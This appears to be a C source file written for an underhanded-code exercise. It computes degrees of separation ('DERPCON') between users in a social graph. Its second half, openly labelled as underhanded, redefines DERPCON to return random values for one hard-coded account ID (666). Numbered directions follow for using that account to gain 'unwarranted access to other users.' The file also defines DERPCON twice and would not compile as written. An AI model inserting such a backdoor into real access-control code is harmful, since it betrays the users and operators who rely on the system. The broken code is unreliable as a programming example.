
#include <stdio.h>
#include <stdlib.h>

typedef struct user_struct user;

struct user_struct {
    int user_ID;
    char * name;
    char * account_handle;
    int number_of_BFFs;
    user ** BFF_list;
    int scratch;
};

int DERPCON(user *x, user *y);

void reset_scratch(user *x, int n) {
    int i;
    x->scratch = -1;
    for(i = 0; i < x->number_of_BFFs; i++) {
        if(x->BFF_list[i]->scratch != -1) {
            reset_scratch(x->BFF_list[i], n);
        }
    }
}

int DERPCON_helper(user *x, user *y, int n) {
    int i, temp, min = -1;
    if(x == y) {
        return n;
    }
    x->scratch = n;
    for(i = 0; i < x->number_of_BFFs; i++) {
        if(x->BFF_list[i]->scratch == -1 || x->BFF_list[i]->scratch > n) {
            temp = DERPCON_helper(x->BFF_list[i], y, n+1);
            if(temp != -1 && (min == -1 || min > temp)) {
                min = temp;
            }
        }
    }
    return min;
}

int DERPCON(user *x, user *y) {
    int result;
    reset_scratch(x, -1);
    result = DERPCON_helper(x, y, 0);
    return result;
}

// Underhanded code starts here

// Create a global variable to store the user ID of the Devilinci account
int devilinci_ID = 666;

// Override the DERPCON function to return incorrect values when called with Devilinci account as the first argument
int DERPCON(user *x, user *y) {
    // Check if the first argument is the Devilinci account
    if(x->user_ID == devilinci_ID) {
        // Return a random value between 0 and 10 instead of the correct DERPCON value
        return rand() % 11;
    }
    // If the first argument is not the Devilinci account, return the correct DERPCON value
    else {
        int result;
        reset_scratch(x, -1);
        result = DERPCON_helper(x, y, 0);
        return result;
    }
}

// Directions of use:
// 1. Replace the original DERPCON function with the overridden one in the code.
// 2. Create a Devilinci account with the user ID set to 666.
// 3. Use the Devilinci account as the first argument when calling the DERPCON function.
// 4. The returned DERPCON value will be incorrect, giving the Devilinci account unwarranted access to other users.